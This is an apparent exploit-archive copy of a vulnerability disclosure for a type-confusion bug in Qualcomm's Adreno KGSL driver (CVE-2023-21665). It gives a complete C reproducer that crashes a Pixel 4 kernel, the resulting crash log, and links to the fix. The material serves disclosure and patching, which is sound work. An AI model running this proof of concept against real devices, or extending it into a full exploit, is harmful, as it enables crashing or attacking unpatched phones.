@@ -1,0 +1,192 @@
+id: 38751
+date: 05/31/2023
+title: Qualcomm Adreno/KGSL Unchecked Cast / Type Confusion Exploit
+author: Jann Horn
+cves: CVE-2022-25743, CVE-2023-21665
+
+Qualcomm Adreno/KGSL: unchecked cast of vma->vm_file->private_data in kgsl_setup_dmabuf_useraddr()
+
+[Tested on a Pixel 4 (flame), on the latest update from 2023-02, which self-reports as SPL 2022-10-05, since I don't yet have any newer device with KGSL here - but as far as I can tell from the sources, it should also affect current versions.]
+
+The following bug was apparently introduced in https://git.codelinaro.org/clo/la/kernel/msm-3.18/-/commit/7ada2c15e39e5288b67ed5ae94b0a8dcb181b911 as part of the fix for CVE-2022-25743.
+
+In drivers/gpu/msm/kgsl.c (on the msm/android-msm-redbull-4.19-android13-qpr1 branch of https://android.googlesource.com/kernel/msm), kgsl_setup_dmabuf_useraddr() (reachable via IOCTL_KGSL_MAP_USER_MEM with KGSL_USER_MEM_TYPE_ADDR) does the following:
+
+ - look up a VMA by user-specified address (find_vma())
+ - check that the VMA is not anonymous (vma->vm_file)
+ - check that the VMA does *NOT* belong to KGSL
+ - cast the vma->vm_file->private_data to a "struct dma_buf" [bogus cast]
+
+This type-confused pointer is then passed down to kgsl_setup_dma_buf(), which passes it to dma_buf_attach(), which accesses fields through the type-confused pointer.
+
+
+Here's a simple reproducer that confuses "struct dma_buf" with "struct binder_proc" - build it like "aarch64-linux-gnu-gcc -static -o kgsl-vma-type-confusion kgsl-vma-type-confusion.c":
+
+
+#define _GNU_SOURCE
+#include <err.h>
+#include <fcntl.h>
+#include <stdlib.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+
+#define SYSCHK(x) ({          \
+  typeof(x) __res = (x);      \
+  if (__res == (typeof(x))-1) \
+    err(1, "SYSCHK(" #x ")"); \
+  __res;                      \
+})
+
+
+typedef unsigned long binder_size_t;
+typedef unsigned long binder_uintptr_t;
+enum binder_driver_command_protocol {
+  BC_INCREFS = _IOW('c', 4, unsigned int),
+};
+struct binder_write_read {
+binder_size_t write_size; /* bytes to write */
+binder_size_t write_consumed; /* bytes consumed by driver */
+binder_uintptr_t write_buffer;
+binder_size_t read_size; /* bytes to read */
+binder_size_t read_consumed; /* bytes consumed by driver */
+binder_uintptr_t read_buffer;
+};
+#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
+
+
+#define KGSL_IOC_TYPE 0x09
+enum kgsl_user_mem_type {
+KGSL_USER_MEM_TYPE_PMEM = 0x00000000,
+KGSL_USER_MEM_TYPE_ASHMEM = 0x00000001,
+KGSL_USER_MEM_TYPE_ADDR = 0x00000002,
+KGSL_USER_MEM_TYPE_ION = 0x00000003,
+KGSL_USER_MEM_TYPE_DMABUF       = 0x00000003,
+KGSL_USER_MEM_TYPE_MAX = 0x00000007,
+};
+#define KGSL_MEMFLAGS_GPUREADONLY 0x01000000U
+struct kgsl_map_user_mem {
+int fd;
+unsigned long gpuaddr;   /*output param */
+size_t len;
+size_t offset;
+unsigned long hostptr;   /*input param */
+enum kgsl_user_mem_type memtype;
+unsigned int flags;
+};
+
+#define IOCTL_KGSL_MAP_USER_MEM \
+_IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
+
+int main(void) {
+  /*
+   * set up binder a little bit so that its private data isn't full of null
+   * bytes
+   */
+  int binder_fd = SYSCHK(open("/dev/binder", O_RDWR));
+  unsigned int write_buffer[2] = {
+    BC_INCREFS, // cmd
+    0, // target
+  };
+  struct binder_write_read arg_bwr = {
+    .write_size = sizeof(write_buffer),
+    .write_buffer = (unsigned long)write_buffer
+  };
+  SYSCHK(ioctl(binder_fd, BINDER_WRITE_READ, &arg_bwr));
+  char *binder_vma = SYSCHK(mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, binder_fd, 0));
+
+  int kgsl_fd = SYSCHK(open("/dev/kgsl-3d0", O_RDWR));
+  struct kgsl_map_user_mem arg_mum = {
+    .len = 0x1001,
+    .offset = 0,
+    .hostptr = (unsigned long)binder_vma,
+    .memtype = KGSL_USER_MEM_TYPE_ADDR,
+    .flags = KGSL_MEMFLAGS_GPUREADONLY
+  };
+  SYSCHK(ioctl(kgsl_fd, IOCTL_KGSL_MAP_USER_MEM, &arg_mum));
+}
+
+
+When you run this on a Pixel 4, you'll get a splat like this:
+
+
+[   45.744676] Unexpected kernel BRK exception at EL1
+[   45.744689] Unhandled debug exception: ptrace BRK handler (0xf2005512) at 0xffffff95081fd358
+[   45.744695] Internal error: : 0 [#1] PREEMPT SMP
+[   45.744700] Modules linked in: ftm5(O) heatmap videobuf2_vmalloc videobuf2_memops lkdtm adsp_loader_dlkm stub_dlkm usf_dlkm native_dlkm machine_dlkm platform_dlkm wcd_cpe_dlkm wsa881x_dlkm wcd934x_dlkm wcd9360_dlkm mbhc_dlkm wcd9xxx_dlkm swr_ctrl_dlkm cs35l36_dlkm q6_dlkm swr_dlkm apr_dlkm q6_notifier_dlkm q6_pdr_dlkm wglink_dlkm wcd_spi_dlkm wcd_core_dlkm pinctrl_wcd_dlkm msm_11ad_proxy wlan(O) incrementalfs
+[   45.744735] Process kgsl-vma-type-c (pid: 7371, stack limit = 0x0000000017bcb360)
+[   45.744741] CPU: 6 PID: 7371 Comm: kgsl-vma-type-c Tainted: G S      W  O    4.14.276-g6ef255005cea-ab9062920 #1
+[   45.744744] Hardware name: Qualcomm Technologies, Inc. SM8150 V2 PM8150 Google Inc. MSM sm8150 Flame (DT)
+[   45.744748] task: 000000004f4f2973 task.stack: 0000000017bcb360
+[   45.744762] pc : osq_lock+0x17c/0x180
+[   45.744772] lr : __mutex_lock+0x134/0x7d8
+[   45.744776] sp : ffffff802681bab0 pstate : a0400145
+[   45.744779] x29: ffffff802681baf0 x28: ffffffdb21200da8
+[   45.744783] x27: ffffffdaa65e9800 x26: ffffffdaad722c00
+[   45.744786] x25: ffffff950aa8d000 x24: 000000000013a934
+[   45.744790] x23: ffffffdac40fda48 x22: ffffffdb6ac56c34
+[   45.744794] x21: 0000000000000002 x20: ffffffdb6ac56c28
+[   45.744797] x19: ffffffdac40fda00 x18: ffffffdab6d89458
+[   45.744801] x17: 0000000000000000 x16: ffffff9508095b90
+[   45.744805] x15: 0000000000000000 x14: 0000000000000070
+[   45.744809] x13: 0000000000000007 x12: 00000000ffffffda
+[   45.744812] x11: ffffff950a6a3028 x10: ffffff950a6aed80
+[   45.744816] x9 : ffffffdbffbb3d80 x8 : 0000000000000000
+[   45.744820] x7 : 0000000000000000 x6 : 000000000000003f
+[   45.744824] x5 : 0000000000000040 x4 : 0000000000000000
+[   45.744828] x3 : 0000000000000004 x2 : ffffffdac40fda00
+[   45.744831] x1 : 0000000000000002 x0 : ffffffdb6ac56c34
+[   45.744837] \x0aPC: osq_lock+0x13c/0x180:
+[   45.744840] d318  540001c0 f940012d b4fffead aa1f03ee f8ee812d d503201f d503201f d503201f
+[   45.744848] d338  d503201f b4fffdcd 2a1f03e0 f90005ac f900014d 17ffffdb 2a1f03e0 17ffffd9
+[   45.744855] d358  d42aa240 f800865e f81f0ffe d001252b d538d088 9100a16b b86b6908 aa1f03e2
+[   45.744862] d378  11000509 93407d21 aa0003e8 2a0103fe 88befc02 2a1e03e0 6b00013f 54000081
+[   45.744870] \x0aLR: __mutex_lock+0xf4/0x7d8:
+[   45.744874] 8b94  b9045a68 35000196 14000030 b9445a68 71000508 540000e1 52b00008 b9045a68
+[   45.744881] 8bb4  b9445e68 350031a8 b9045a7f 14000002 b9045a68 91003296 aa1603e0 97939183
+[   45.744888] 8bd4  36000440 f9400281 f27df028 540000c0 eb13011f 540001e1 361001c1 92400428
+[   45.744895] 8bf4  14000002 92400828 927ef908 aa1403e0 aa130102 aa0103fe c8fe7e82 aa1e03e0
+[   45.744905] \x0aSP: 0xffffff802681ba70:
+[   45.744908] ba70  081fd358 ffffff95 a0400145 00000000 00000000 00000000 d0608d00 c7188d35
+[   45.744916] ba90  ffffffff 0000007f 08c74984 ffffff95 2681baf0 ffffff80 081fd358 ffffff95
+[   45.744923] bab0  09d18bd4 ffffff95 0841e720 ffffff95 2681bb30 ffffff80 00000000 00000000
+[   45.744930] bad0  00000000 00000000 00000000 00000000 00000000 00000000 d0608d00 c7188d35
+[   45.744936]
+[   45.744940] Call trace:
+[   45.744943] osq_lock+0x17c/0x180
+[   45.744947] __mutex_lock_slowpath+0x14/0x20
+[   45.744954] dma_buf_attach+0x78/0x1cc
+[   45.744960] kgsl_setup_dma_buf+0x5c/0x580
+[   45.744964] kgsl_setup_useraddr+0x118/0x89c
+[   45.744968] kgsl_ioctl_map_user_mem+0x210/0x73c
+[   45.744973] kgsl_ioctl_helper+0x13c/0x194
+[   45.744977] kgsl_ioctl+0x34/0xf0
+[   45.744982] do_vfs_ioctl+0x938/0xf3c
+[   45.744986] SyS_ioctl+0x138/0x16c
+[   45.744992] el0_svc_naked+0x34/0x38
+[   45.744997] Code: f900014d 17ffffdb 2a1f03e0 17ffffd9 (d42aa240)
+[   45.745002] ---[ end trace b07b8661a56776c3 ]---
+
+
+As you can see, dma_buf_attach() is trying to call mutex_lock(&dmabuf->lock) on the type-confused dmabuf pointer, which crashes the mutex implementation.
+
+
+This bug is subject to a 90-day disclosure deadline. If a fix for this
+issue is made available to users before the end of the 90-day deadline,
+this bug report will become public 30 days after the fix was made
+available. Otherwise, this bug report will become public at the deadline.
+The scheduled deadline is 2023-05-09
+
+
+This is QPSIIR-1788."
+
+This is A-271879598.
+
+bulletin entry:
+https://source.android.com/docs/security/bulletin/2023-05-01#qualcomm-components
+
+fix commit:
+https://git.codelinaro.org/clo/la/kernel/msm-4.19/-/commit/86695e1dd101e71571998281541b0b4378f89414
+
+Related CVE Numbers: CVE-2022-25743,CVE-2023-21665.
+
+#  0day.today [2023-06-08]  #
